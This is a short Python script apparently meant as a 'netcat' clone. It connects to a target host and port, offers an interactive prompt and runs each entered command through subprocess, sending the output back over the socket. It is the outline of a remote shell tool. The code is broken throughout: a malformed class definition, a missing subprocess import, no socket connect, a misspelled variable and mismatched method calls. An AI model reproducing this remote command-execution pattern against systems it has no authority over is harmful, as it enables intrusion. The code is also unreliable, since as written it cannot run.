import socket
import optparse
import shlex
import sys

class compSystem(self, target, port):
	self.target = target
	self.port = port
	self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	def run(self):
		self.sendCommand()

	def sendCommand(self, command):
		try:
			self.socket.recv(4096)
			ouput = executeCMD(command)
			self.socket.send(output.encode())
		except:
			print('[-] Communications Error Occured')
			sys.exit()

def executeCMD(command):
	try:
		command = command.strip()
		if command == '':
			return
		return subprocess.check_output(shlex.split(command), stderr=subprocess.STDOUT).decode()
	except:
		print('[-] Failed to process command!')
		sys.exit()

def createSESH(target, port):
	print('[+] Attempting to create Netcat Session!')
	try:
		ncSESH = compSystem(target, port)
		print('[+] Succeeded in creating connection with host!')
		return ncSESH
	except:
		print('[-] Failed to create connection with host!')

def spawnShell(ncSESH):
	command = ' '
	print('[+] Spawning Shell!')
	while True:
		command = input('>>: ')
		if command != '':
			ncSESH.run(command)
		else:
			break
	print('[+] Closing Shell!')

def main():
	print('[+] Loaded up Python Netcat! proceeding to interpret command ...')
	command = optparse.OptionParser()
	command.add_option('-t', action='store', dest='target', type='string', help='specify the target')
	command.add_option('-p', action='store', dest='port', type='int', help='specify the port num')
	options, args = command.parse_args()
	target = options.target
	port = options.port
	print('[+] Data Processing Complete!')
	ncSESH = createSESH(target, port)
	spawnShell(ncSESH)

if __name__ == '__main__':
	main()